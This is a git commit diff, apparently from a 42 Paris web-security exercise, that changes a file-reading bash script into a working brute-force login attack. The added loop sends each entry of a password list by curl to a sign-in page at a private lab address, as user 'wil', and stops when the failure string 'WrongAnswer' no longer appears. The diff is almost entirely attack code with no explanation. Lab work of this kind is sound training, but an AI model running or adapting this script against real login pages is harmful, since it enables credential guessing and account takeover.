c11e93ee99574f40892a41bc833710f1202bacd8
Celine DINE <cdine@bess-f4r1s5.clusters.42paris.fr>
2024-02-06 19:19:11 +0100

    more breaches

--- brut_force/brut-force.sh
+++ brut_force/brut-force.sh
@@ -1,20 +1,28 @@
 #!/bin/bash
 
-# Specify the path to your file
 file_path="./brut_force/password-list.txt"
 
-# Check if the file exists
 if [ -e "$file_path" ]; then
-    # Open the file for reading
+    
     exec 3< "$file_path"
 
-    # Loop over each line in the file
-    while read -r line <&3; do
-        # Process each line (replace this with your actual processing)
+    found_password=false
+    while read -r line <&3 && [ "$found_password" = false ]; do
         echo "Processing line: $line"
+        response=$(curl "http://192.168.59.3/index.php?page=signin&username=wil&password=$line&Login=Login" \
+            -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+            -H 'Accept-Language: en-US,en;q=0.9' \
+            -H 'Connection: keep-alive' \
+            -H 'Referer: http://192.168.59.3/index.php?page=signin' \
+            -H 'Upgrade-Insecure-Requests: 1' \
+            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' \
+            --compressed \
+            --insecure)
+        if ! echo "$response" | grep -q "WrongAnswer"; then
+            found_password=true
+        fi
     done
 
-    # Close the file descriptor
     exec 3<&-
 else
     echo "File not found: $file_path"
